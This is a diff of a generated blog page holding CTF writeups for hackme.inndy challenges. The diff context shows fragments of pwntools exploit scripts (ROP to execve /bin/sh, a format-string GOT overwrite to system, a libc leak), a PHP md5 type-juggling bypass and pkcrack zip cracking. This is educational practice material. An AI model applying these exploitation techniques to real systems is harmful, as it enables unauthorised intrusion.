@@ -25,7 +25,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.81.0 with theme even" />
+<meta name="generator" content="Hugo 0.92.0 with theme even" />
 
 
 <link rel="preload" href="/fonts/iconfont/iconfont.woff" as="font" type="font/woff" crossorigin="anonymous">
@@ -41,7 +41,7 @@
 
 
 
-<link href="/sass/main.min.96e8e2c964270ec266a0efff67202fed95e11f1fc9c9dd9b1219e1f4a54b5c4b.css" rel="stylesheet">
+<link href="/sass/main.min.6e68329c1369b8a285a4985e6b6efdb778e12c12b24e8b3fcdd6c5af778d414e.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
 
 
@@ -51,12 +51,12 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.aloxaf.com/2018/08/hackme_inndy/" /><meta property="article:section" content="post" />
 
-<meta property="article:modified_time" content="2018-08-20T21:37:00&#43;00:00" />
+<meta property="article:modified_time" content="2018-08-20T21:37:00+00:00" />
 
 <meta itemprop="name" content="hackme.inndy 部分writeup">
 <meta itemprop="description" content="听奥博大佬说对新手很友好, 来试试
 官方不建议直接给出 flag, 就不放 flag 了">
-<meta itemprop="dateModified" content="2018-08-20T21:37:00&#43;00:00" />
+<meta itemprop="dateModified" content="2018-08-20T21:37:00+00:00" />
 <meta itemprop="wordCount" content="7705">
 <meta itemprop="keywords" content="ctf,writeup,misc,pwn,web,crypto,reverse," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="hackme.inndy 部分writeup"/>
@@ -282,13 +282,13 @@ decode 之, 得到字符串 <code>Did you tried LSB?</code></p>
 <p>发现里面除了 flag 还有一个图片, crc32 值与开始得到的 png 一样. 显然明文攻击, pkcrack 走起.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">zip plain.zip ../png/00000000.png
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">zip plain.zip ../png/00000000.png
 pkcrack -C 00000094.zip -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P plain.zip -p 00000000.png -d flag.zip -a
 x flag.zip
 cat flag/meow/flag
@@ -311,7 +311,7 @@ cat flag/meow/flag
 <p>下载解压得到 encoder.py 和 flag.enc, 乍一看怀疑这题目真的没放错区吗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -343,7 +343,7 @@ cat flag/meow/flag
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
 
 <span class="kn">import</span> <span class="nn">random</span>
 <span class="kn">import</span> <span class="nn">string</span>
@@ -368,7 +368,7 @@ cat flag/meow/flag
 <span class="n">E</span> <span class="o">=</span> <span class="p">(</span><span class="n">rot13</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="nb">hex</span><span class="p">,</span> <span class="n">upsidedown</span><span class="p">)</span>
 
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">50</span><span class="p">)):</span>
-    <span class="k">print</span> <span class="n">i</span>
+    <span class="nb">print</span> <span class="n">i</span>
     <span class="n">c</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
     <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%d%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">E</span><span class="p">[</span><span class="n">c</span><span class="p">](</span><span class="n">flag</span><span class="p">))</span>
 
@@ -378,7 +378,7 @@ cat flag/meow/flag
 </div><p>不过虽然看上去挺难, 但仔细点就会发现 c 的值就在密文开头</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -410,7 +410,7 @@ cat flag/meow/flag
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
 <span class="kn">import</span> <span class="nn">string</span>
 
@@ -438,7 +438,7 @@ cat flag/meow/flag
     <span class="n">c</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
     <span class="n">data</span> <span class="o">=</span> <span class="n">E</span><span class="p">[</span><span class="n">c</span><span class="p">](</span><span class="n">data</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">):</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
         <span class="k">break</span>
 </code></pre></td></tr></table>
 </div>
@@ -455,7 +455,7 @@ cat flag/meow/flag
 <p>charset 37位, 开个19线程. 跑了二十多分钟就出 flag 了.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -486,7 +486,7 @@ cat flag/meow/flag
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_uppercase</span><span class="p">,</span> <span class="n">digits</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_uppercase</span><span class="p">,</span> <span class="n">digits</span>
 <span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
@@ -526,10 +526,10 @@ cat flag/meow/flag
 <p>总共就两种, 把这个序列转成二进制, 再转ASCII, 就得到了 flag</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">grep -oP <span class="s2">&#34;(▄▀▀▒██▒██▒)|(▄▀▀ ██ ██ )&#34;</span> pusheen.txt<span class="p">|</span>xargs <span class="nb">echo</span> -n<span class="p">|</span>sed <span class="s1">&#39;s/▄▀▀▒██▒██▒/1/g;s/▄▀▀ ██ ██/0/g;s/ //g&#39;</span><span class="p">|</span>rax2 -bt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">grep -oP <span class="s2">&#34;(▄▀▀▒██▒██▒)|(▄▀▀ ██ ██ )&#34;</span> pusheen.txt<span class="p">|</span>xargs <span class="nb">echo</span> -n<span class="p">|</span>sed <span class="s1">&#39;s/▄▀▀▒██▒██▒/1/g;s/▄▀▀ ██ ██/0/g;s/ //g&#39;</span><span class="p">|</span>rax2 -bt
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="big">big</h2>
@@ -540,18 +540,18 @@ cat flag/meow/flag
 <p>xzcat 看一下前面, 发现都是 <code>THISisNOTFLAG{}</code>, 估计在最末尾&hellip;&hellip;</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">lzma</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">lzma</span>
 
 <span class="n">f</span> <span class="o">=</span> <span class="n">lzma</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;./big.xz&#39;</span><span class="p">)</span>
 <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#巨慢的 seek()...</span>
-<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>(听 M4x 师傅说这道题 Inndy 师傅本意是让我们直接修改 xz 文件去掉开头的一堆重复&hellip;)</p>
@@ -588,7 +588,7 @@ Tips: LFI, php://filter</p>
 <p>(值得一提的是 chrome 似乎自带了反混淆功能? 执行混淆后的代码, 在输出中点击 VM374:3 这种, 就会得到非常清晰的代码)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -602,7 +602,7 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">print_qrcode</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">print_qrcode</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[],</span>
     <span class="nx">l</span> <span class="o">=</span> <span class="p">[];</span>
   <span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span> <span class="o">||</span> <span class="s2">&#34;22px&#34;</span><span class="p">,</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">n</span> <span class="o">||</span> <span class="s2">&#34;black&#34;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">||</span> <span class="s2">&#34;white&#34;</span><span class="p">;</span>
@@ -648,10 +648,10 @@ Tips: LFI, php://filter</p>
 <p>验证密码的方式是</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;00000000000000000000000000000000&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;00000000000000000000000000000000&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>php 的神奇类型转换, <code>'0e123456' == '0'</code>, 只要找一个以 0e 开头并且后面全是纯数字的 md5 就行了.</p>
@@ -674,7 +674,7 @@ Tips: LFI, php://filter</p>
 <p>确实很simple</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -682,12 +682,12 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
 
 <span class="n">s</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;UIJT.JT.ZPVS.GMBH&#39;</span>
 
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="pyyy">pyyy</h2>
@@ -698,11 +698,11 @@ Tips: LFI, php://filter</p>
 举个例子, 下面代码中的 self 就代表那个匿名函数自身.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">))(</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">))(</span>
     <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="s1">&#39;I can call my self&#39;</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
@@ -756,7 +756,7 @@ Tips: LFI, php://filter</p>
 真的是相当慢.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -771,7 +771,7 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s1">&#39;a1, a2&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s1">&#39;a1, a2&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
 <span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
 <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a1</span> <span class="o">*</span> <span class="n">a2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">574406350</span><span class="p">)</span>
 <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="mh">0x7E</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1931514558</span><span class="p">)</span>
@@ -782,7 +782,7 @@ Tips: LFI, php://filter</p>
     <span class="n">x</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
     <span class="n">y</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a2</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
     <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
     <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">a1</span> <span class="o">!=</span> <span class="n">x</span><span class="p">,</span> <span class="n">a2</span> <span class="o">!=</span> <span class="n">y</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
@@ -828,17 +828,17 @@ ROP輕鬆談 by L4ys</p>
 <blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">nc hackme.inndy.tw 7703
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nc hackme.inndy.tw 7703
 </code></pre></td></tr></table>
 </div>
 </div><p><code>ROPgadget</code>  not working anymore</p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -846,7 +846,7 @@ ROP輕鬆談 by L4ys</p>
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">[*] &#39;/tmp/tmp/rop2&#39;
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[*] &#39;/tmp/tmp/rop2&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -857,7 +857,7 @@ ROP輕鬆談 by L4ys</p>
 </div><p>开了栈不可执行. 不过可以调用 SYS_read, 往 some_buffer (.bss段的某个全局变量) 写入 /bin/sh, 然后调用 SYS_exexce get shell</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -885,7 +885,7 @@ ROP輕鬆談 by L4ys</p>
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">pwnlib.constants</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
@@ -935,7 +935,7 @@ Tips: format string vulnerability</p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -944,7 +944,7 @@ Tips: format string vulnerability</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">▶ checksec echo
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">▶ checksec echo
 [*] &#39;/home/aloxaf/CTF/echo&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -957,7 +957,7 @@ Tips: format string vulnerability</p>
 并且有 system 函数可以利用.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -976,7 +976,7 @@ Tips: format string vulnerability</p>
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-10Ch]
 </span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+10Ch] [ebp-Ch]
@@ -997,7 +997,7 @@ Tips: format string vulnerability</p>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1024,7 +1024,7 @@ Tips: format string vulnerability</p>
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -1038,8 +1038,8 @@ Tips: format string vulnerability</p>
 <span class="c1"># 没有开ASLR, 可以直接从 elf 中读取 plt </span>
 <span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
 <span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_plt: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_plt</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_plt: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_plt</span><span class="p">))</span>
 
 <span class="c1"># pwnlib.gdb.attach(io)</span>
 
@@ -1066,7 +1066,7 @@ Tips: ASLR enabled</p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1075,7 +1075,7 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">▶ checksec echo2
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">▶ checksec echo2
 [*] &#39;/home/aloxaf/CTF/echo2&#39;
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -1090,7 +1090,7 @@ Tips: ASLR enabled</p>
 <p>调试判断出距离 <code>main+74</code> 的偏移是41, <code>__libc_start_main+243 </code> 的偏移是 43</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1153,7 +1153,7 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">61
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
 
 <span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
@@ -1170,22 +1170,22 @@ Tips: ASLR enabled</p>
 <span class="n">main_addr</span><span class="p">,</span> <span class="n">libc_addr</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
 <span class="n">main_addr</span> <span class="o">-=</span> <span class="mi">74</span>
 <span class="n">libc_addr</span> <span class="o">-=</span> <span class="mi">240</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;main_addr: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>
